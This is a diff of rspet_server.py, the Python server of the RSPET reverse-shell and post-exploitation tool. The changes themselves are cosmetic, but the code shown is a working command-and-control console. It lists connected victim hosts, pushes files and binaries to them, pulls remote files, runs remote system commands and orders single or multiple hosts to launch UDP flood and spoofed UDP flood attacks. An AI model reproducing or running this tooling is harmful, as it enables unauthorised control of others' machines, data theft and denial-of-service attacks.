@@ -1,15 +1,8 @@
 #!/usr/bin/env python2
 # -*- coding: <UTF-8> -*-
-from __future__ import print_function
-
 """rspet_server.py: RSPET's Server-side script."""
-__author__ = "Kolokotronis Panagiotis"
-__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
-__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
-__license__ = "MIT"
-__version__ = "0.1.0"
-__maintainer__ = "Kolokotronis Panagiotis"
 
+from __future__ import print_function
 from sys import exit as sysexit
 from sys import argv
 from thread import start_new_thread
@@ -19,6 +12,12 @@ from socket import error as sock_error
 import logging as log
 import tab
 
+__author__ = "Kolokotronis Panagiotis"
+__copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
+__credits__ = ["Kolokotronis Panagiotis", "Lain Iwakura"]
+__license__ = "MIT"
+__version__ = "0.1.0"
+__maintainer__ = "Kolokotronis Panagiotis"
 
 def conn_accept(sock, f_handler):
     """Listen for connection, usually invocted in parallel.
@@ -67,7 +66,7 @@ def get_len(in_string, max_len):
 
 # Using printf like formating (%03d for example)
     tmp_str = "%0" + str(max_len) + "d"
-    return (tmp_str % (len(in_string)))
+    return tmp_str % (len(in_string))
 
 
 def recv_comm(recv_size, f_cur_host_con):
@@ -98,8 +97,8 @@ def print_hosts(f_active_hosts, f_list_of_selected_hosts):
         current_host_port = f_active_hosts[f_host_id][1][1]
         current_host_version = f_active_hosts[f_host_id][2][0]
         current_host_type = f_active_hosts[f_host_id][2][1]
-        print ("["+str(f_host_id)+"] "+current_host_ip+":"+str(current_host_port)
-               +"\t"+current_host_version+"-"+current_host_type)
+        print("["+str(f_host_id)+"] "+current_host_ip+":"+str(current_host_port)
+              +"\t"+current_host_version+"-"+current_host_type)
     return 0
 
 
@@ -209,18 +208,18 @@ def make_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     if f_decode == "fna":
         return_code = 2
     else:
-            f_command = file_to_read.read()
-            file_to_read.close()
-            f_size = get_len(f_command, 13)
-            f_res = send_comm(f_size, f_cur_host_con)
-            if f_res == 1:
-                f_handler.remove_host(f_cur_host_id)
-                return 1
-            f_res = send_comm(f_command, f_cur_host_con)
-            if f_res == 1:
-                f_handler.remove_host(f_cur_host_id)
-                return 1
-            f_decode = recv_comm(3, f_cur_host_con)
+        f_command = file_to_read.read()
+        file_to_read.close()
+        f_size = get_len(f_command, 13)
+        f_res = send_comm(f_size, f_cur_host_con)
+        if f_res == 1:
+            f_handler.remove_host(f_cur_host_id)
+            return 1
+        f_res = send_comm(f_command, f_cur_host_con)
+        if f_res == 1:
+            f_handler.remove_host(f_cur_host_id)
+            return 1
+        f_decode = recv_comm(3, f_cur_host_con)
     return return_code
 
 
@@ -289,7 +288,7 @@ def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     try:
         remote_file_name = name_set[0]
     except IndexError:
-        print ("Remote file name not provided")
+        print("Remote file name not provided")
         return_code = 2
     else:
         try:
@@ -311,13 +310,13 @@ def pull_file(name_set, f_cur_host_con, f_cur_host_id, f_handler):
             return 1
         f_decode = recv_comm(3, f_cur_host_con)
         if f_decode == 'fna':
-            print ("File does not exist or Access Denied")
+            print("File does not exist or Access Denied")
             return_code = 2
         else:
             try:
                 local_file = open(local_file_name, 'w')
             except IOError:
-                print ("Cannot create local file")
+                print("Cannot create local file")
                 return_code = 2
             else:
                 f_decode = recv_comm(13, f_cur_host_con)
@@ -340,7 +339,7 @@ def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
     try:
         remote_bin_name = name_set[0]
     except IndexError:
-        print ("Remote binary name not provided")
+        print("Remote binary name not provided")
         return_code = 2
     else:
         try:
@@ -354,23 +353,23 @@ def pull_binary(name_set, f_cur_host_con, f_cur_host_id, f_handler):
         bname_size = get_len(remote_bin_name, 3)
         f_res = send_comm(bname_size, f_cur_host_con)
         if f_res == 1:
-            print ("Connection closed by client")
+            print("Connection closed by client")
             f_handler.remove_host(f_cur_host_id)
             return 1
         f_res = send_comm(remote_bin_name, f_cur_host_con)
         if f_res == 1:
-            print ("Connection closed by client")
+            print("Connection closed by client")
             f_handler.remove_host(f_cur_host_id)
             return 1
         f_decode = recv_comm(3, f_cur_host_con)
         if f_decode == 'fna':
-            print ("File does not exist or Access Denied")
+            print("File does not exist or Access Denied")
             return_code = 2
         else:
             try:
                 local_bin = open(local_bin_name, 'wb')
             except IOError:
-                print ("Cannot create local file")
+                print("Cannot create local file")
                 return_code = 2
             else:
                 f_decode = recv_comm(13, f_cur_host_con)
@@ -413,42 +412,42 @@ def multihost_calls(func_ref, args_list, f_handler, f_list_of_selected_hosts):
 
 def list_root_commands(handler=None, command=None):
     """Print List of Server Commands."""
-    print ("List of Server Commands")
-    print ("$List_Commands -> Display this list")
-    print ("$List_Hosts -> Display connected hosts")
-    print ("$Choose_Host host_no -> Select host from list")
-    print ("$Select (commaSeperatedHostIDs) -> Select specified hosts")
-    print ("$ALL -> Select all hosts and display available commands")
-    print ("$Exit -> Exit this program")
+    print("List of Server Commands")
+    print("$List_Commands -> Display this list")
+    print("$List_Hosts -> Display connected hosts")
+    print("$Choose_Host host_no -> Select host from list")
+    print("$Select (commaSeperatedHostIDs) -> Select specified hosts")
+    print("$ALL -> Select all hosts and display available commands")
+    print("$Exit -> Exit this program")
 
 
 def list_connected_commands():
     """Print List of Commands when Host is Selected."""
-    print ("List of Commands when Host is Selected")
-    print ("$List_Commands -> Display this list")
-    print ("$Make_File local_file_name (remote_file_name)-> Send local file")
-    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Send local binary")
-    print ("$Pull_File remote_file_name (local_file_name)-> Get remote file")
-    print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
-    print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
-    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
-    print ("$KILL -> All selected Hosts stop current perpetual task")
-    print ("$Close_Connection -> Close Connection and remove host")
-    print ("$Exit -> Exit to the main interface")
+    print("List of Commands when Host is Selected")
+    print("$List_Commands -> Display this list")
+    print("$Make_File local_file_name (remote_file_name)-> Send local file")
+    print("$Make_Binary localBinaryName (remoteBinaryName)-> Send local binary")
+    print("$Pull_File remote_file_name (local_file_name)-> Get remote file")
+    print("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
+    print("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
+    print("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
+    print("$KILL -> All selected Hosts stop current perpetual task")
+    print("$Close_Connection -> Close Connection and remove host")
+    print("$Exit -> Exit to the main interface")
 
 
 def list_connected_mult_commands():
     """Print List of Commands when ALL Host are Selected."""
-    print ("List of Commands when ALL Host are Selected")
-    print ("$List_Commands -> Display this list")
-    print ("$List_Sel_Hosts -> Display selected hosts")
-    print ("$Make_File local_file_name (remote_file_name)-> Create remote file")
-    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
-    print ("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
-    print ("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
-    print ("$KILL -> All selected Hosts stop current perpetual task")
-    print ("$Close_Connection -> close connection with and remove all selected hosts")
-    print ("$Exit -> Exit to the main interface")
+    print("List of Commands when ALL Host are Selected")
+    print("$List_Commands -> Display this list")
+    print("$List_Sel_Hosts -> Display selected hosts")
+    print("$Make_File local_file_name (remote_file_name)-> Create remote file")
+    print("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
+    print("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
+    print("$UDP_Spoof targetIP targetPort spoofedIP spoofedPort (msg) -> Spoofed UDP Flood Attack")
+    print("$KILL -> All selected Hosts stop current perpetual task")
+    print("$Close_Connection -> close connection with and remove all selected hosts")
+    print("$Exit -> Exit to the main interface")
 
 
 def make_logo():
@@ -481,20 +480,20 @@ def system_comm(command, cur_host_con):
     command = " ".join(com_reconst)
     res = send_comm(CC['command'], cur_host_con)
     if res == 1:
-        print ("Connection closed by client")
+        print("Connection closed by client")
         return 1
     len_command = get_len(command, 13)
     res = send_comm(len_command, cur_host_con)
     if res == 1:
-        print ("Connection closed by client")
+        print("Connection closed by client")
         return 1
     res = send_comm(command, cur_host_con)
     if res == 1:
-        print ("Connection closed by client")
+        print("Connection closed by client")
         return 1
     decode = recv_comm(13, cur_host_con)
     decode = recv_comm(int(decode), cur_host_con)
-    print (decode)
+    print(decode)
     return 0
 
 
@@ -541,14 +540,14 @@ def choose_host(handler, command):
     try:
         cur_host_id = int(command[1])
     except (IndexError, ValueError):
-        print ("Argument missing or not int")
+        print("Argument missing or not int")
         return 1
     active_hosts = handler.return_list_of_hosts()
     try:
         cur_host_ip = active_hosts[cur_host_id][1][0]
         cur_host_con = active_hosts[cur_host_id][0]
     except IndexError:
-        print ("Host ID out of bounds")
+        print("Host ID out of bounds")
         return 1
     list_connected_commands()
     while True:
@@ -596,7 +595,7 @@ def select_hosts(handler, command):
         for host_id in hosts_string:
             list_of_selected_hosts.append(int(host_id.replace(" ", "")))
     except (IndexError, ValueError):
-        print ("No host IDs provided or Host IDs not integers")
+        print("No host IDs provided or Host IDs not integers")
         return 1
     list_connected_mult_commands()
     while True:
@@ -628,7 +627,7 @@ def select_hosts(handler, command):
                 active_hosts = handler.return_list_of_hosts()
                 multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
             except KeyError:
-                print ("Command not recognised")
+                print("Command not recognised")
     return 0
 
 
@@ -673,7 +672,7 @@ def all_hosts(handler, command):
                 active_hosts = handler.return_list_of_hosts()
                 multihost_calls(func_to_call, args_to_pass, handler, list_of_selected_hosts)
             except KeyError:
-                print ("Command not recognised")
+                print("Command not recognised")
     return 0
 
 
@@ -694,7 +693,8 @@ class ClientHandler(object):
         ver_type_tup -- tuple of client version and type
         """
 
-        log.info("Client connected %s:%s with version %s-%s", ip_port_tup[0], ip_port_tup[1], ver_type_tup[0], ver_type_tup[1])
+        log.info("Client connected %s:%s with version %s-%s", ip_port_tup[0],
+                 ip_port_tup[1], ver_type_tup[0], ver_type_tup[1])
         self.list_of_hosts.append([host, ip_port_tup, ver_type_tup])
 
     def remove_host(self, f_host_id):
@@ -703,7 +703,8 @@ class ClientHandler(object):
         Keyword argument(s):
         f_host_id -- ID of host to remove
         """
-        log.info("Client %s:%s removed", self.list_of_hosts[f_host_id][1][0], self.list_of_hosts[f_host_id][1][1])
+        log.info("Client %s:%s removed", self.list_of_hosts[f_host_id][1][0],
+                 self.list_of_hosts[f_host_id][1][1])
         del self.list_of_hosts[f_host_id]
 
     def rebuild(self):
@@ -780,7 +781,7 @@ CONN_MUL_COMMAND_DICT = {
 
 def main():
     """Script's main block"""
-    log.basicConfig(level=log.DEBUG)
+    log.basicConfig(level=log.DEBUG, filename="RSPET_server.log")
 
     make_logo()
     try:
@@ -820,7 +821,7 @@ def main():
                     sock.close()
                     sysexit()
 
-                print ("Command not recognised! Try List_Commands for help")
+                print("Command not recognised! Try List_Commands for help")
                 continue
         except (KeyboardInterrupt, SystemExit):
             sock.close()
